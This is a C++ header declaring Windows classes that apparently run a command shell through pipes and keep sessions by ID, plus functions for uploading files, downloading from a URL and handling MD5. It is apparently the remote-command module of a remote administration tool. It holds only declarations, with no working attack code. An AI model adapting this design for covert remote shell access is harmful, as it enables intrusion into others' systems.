// Telnet.h: interface for the Telnet class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_TELNET_H__2137F2CC_D05F_4D8A_A883_D4A4B6F9276B__INCLUDED_)
#define AFX_TELNET_H__2137F2CC_D05F_4D8A_A883_D4A4B6F9276B__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <WinInet.h>

#pragma warning(disable : 4786)
#include "map"
#include "string"
using namespace std;

class Telnet  
{
public:
	Telnet();
	virtual ~Telnet();

	void reset();
	char* Excute(const char* cmd);

private:
	BOOL init();

	HANDLE hWriteFile;
	HANDLE hReadFile; 
	HANDLE hReadPipe;
	HANDLE hWritePipe;
	PROCESS_INFORMATION processinfo; 
};

BOOL UpfilebytTelnet(const char * cmd);
BOOL GetFile (HINTERNET IN hOpen, CHAR *szUrl, WCHAR *szFileName);

char* TelnetDealMD5(const char * cmd);

DWORD TelnetCmd(DWORD* pPara);

//////////////////////////////////////////////////////////////////////////

class SyncTelnet  
{
public:
	SyncTelnet();
	~SyncTelnet();
	
public:
	
	void reset();
	void ReadCmd();
	void SyncExcute(const char* cmd);
	static DWORD WINAPI ReadCmdThread(LPVOID pParam);
	void SetSessionID(string strSession);
	
private:
	BOOL init();
	
	HANDLE hWriteFile;
	HANDLE hReadFile; 
	HANDLE hReadPipe;
	HANDLE hWritePipe;
	PROCESS_INFORMATION processinfo; 

	string m_strSession;
};

class TelnetMap:public map<string, SyncTelnet*>
{
public:
	TelnetMap();
	~TelnetMap();
	
	SyncTelnet * FindTelnet(string SessionID);
	bool DeleteTelnet(string SessionID);
	
private:
	BOOL getallow(long &hashallow);
	BOOL releaseallow(long &hashallow);
	
	long g_addallow; 
};

typedef TelnetMap::iterator TelnetMapIterator;

extern TelnetMap g_TelnetMap;

DWORD SyncTelnetCmd(DWORD* pPara);

#endif // !defined(AFX_TELNET_H__2137F2CC_D05F_4D8A_A883_D4A4B6F9276B__INCLUDED_)
